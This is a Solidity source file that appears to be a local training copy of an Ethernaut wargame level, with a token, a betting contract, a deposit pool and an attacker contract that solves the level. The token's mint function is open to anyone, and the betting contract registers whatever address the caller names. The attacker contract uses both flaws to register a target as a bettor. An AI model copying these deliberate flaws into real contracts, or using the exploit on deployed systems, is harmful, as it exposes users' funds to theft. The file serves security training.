// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Local training fixture (Ethernaut 2025 BetHouse + Pool).
contract PoolToken {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address account, uint256 amount) external {
        balanceOf[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function burn(address account, uint256 amount) external {
        balanceOf[account] -= amount;
        emit Transfer(account, address(0), amount);
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        allowance[from][msg.sender] -= value;
        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract BetHouse {
    address public pool;

    error InsufficientFunds();
    error FundsNotLocked();

    mapping(address => bool) private bettors;

    constructor(address pool_) {
        pool = pool_;
    }

    function makeBet(address bettor_) external {
        if (IERC20(pool).balanceOf(msg.sender) < 20) {
            revert InsufficientFunds();
        }
        if (!Pool(pool).depositsLocked(msg.sender)) revert FundsNotLocked();
        bettors[bettor_] = true;
    }

    function isBettor(address bettor_) external view returns (bool) {
        return bettors[bettor_];
    }
}

contract Pool {
    address public wrappedToken;
    address public depositToken;

    mapping(address => uint256) private depositedEther;
    mapping(address => uint256) private depositedPDT;
    mapping(address => bool) private depositsLockedMap;
    bool private alreadyDeposited;

    constructor(address wrappedToken_, address depositToken_) {
        wrappedToken = wrappedToken_;
        depositToken = depositToken_;
    }

    function deposit(uint256 value_) external payable {
        require(!depositsLockedMap[msg.sender], "locked");
        uint256 _valueToMint;
        if (msg.value == 0.001 ether) {
            require(!alreadyDeposited, "already");
            depositedEther[msg.sender] += msg.value;
            alreadyDeposited = true;
            _valueToMint += 10;
        }
        if (value_ > 0) {
            require(PoolToken(depositToken).allowance(msg.sender, address(this)) >= value_, "allowance");
            depositedPDT[msg.sender] += value_;
            PoolToken(depositToken).transferFrom(msg.sender, address(this), value_);
            _valueToMint += value_;
        }
        require(_valueToMint != 0, "invalid");
        PoolToken(wrappedToken).mint(msg.sender, _valueToMint);
    }

    function lockDeposits() external {
        depositsLockedMap[msg.sender] = true;
    }

    function depositsLocked(address account_) external view returns (bool) {
        return depositsLockedMap[account_];
    }

    function balanceOf(address account_) external view returns (uint256) {
        return PoolToken(wrappedToken).balanceOf(account_);
    }
}

// Attacker: seeds the pool's PDT, deposits 0.001 ETH (10 wrapped) + 10 PDT
// (10 wrapped) = 20 wrapped, locks deposits, then registers the target as
// a bettor through BetHouse.makeBet(target).
contract BetHouseAttack {
    function attack(BetHouse betHouse, Pool pool, PoolToken pdt, PoolToken wrapped, address target) external payable {
        pdt.mint(address(this), 10);
        pdt.approve(address(pool), 10);
        pool.deposit{value: 0.001 ether}(10);
        pool.lockDeposits();
        betHouse.makeBet(target);
    }

    receive() external payable {}
}

